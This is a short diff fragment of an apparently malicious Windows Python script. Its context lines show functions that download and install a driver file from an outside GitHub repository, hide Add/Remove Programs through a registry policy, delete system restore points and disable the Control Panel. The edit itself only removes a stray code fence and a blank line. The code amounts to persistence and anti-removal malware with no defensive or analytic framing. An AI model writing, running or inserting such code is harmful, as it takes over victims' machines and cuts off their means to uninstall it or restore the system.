@@ -21,7 +21,6 @@ def download_and_install_driver(driver_link):
 
 # Example of how to use the function
 download_and_install_driver('https://github.com/s-b-repo/easy-peasy-ssh/blob/main/windowssafetykernel.inf')
-```
 
 def disable_uninstall_settings_windows():
     subprocess.run(["reg", "add", "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Uninstall", "/v", "NoAddRemovePrograms", "/t", "REG_DWORD", "/d", "1", "/f"])
@@ -52,7 +51,6 @@ def delete_restore_points():
         print("Restore points deleted successfully.")
     except Exception as e:
         print("An error occurred:", e)
-
 
 def disable_control_panel():
     os.system("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f")
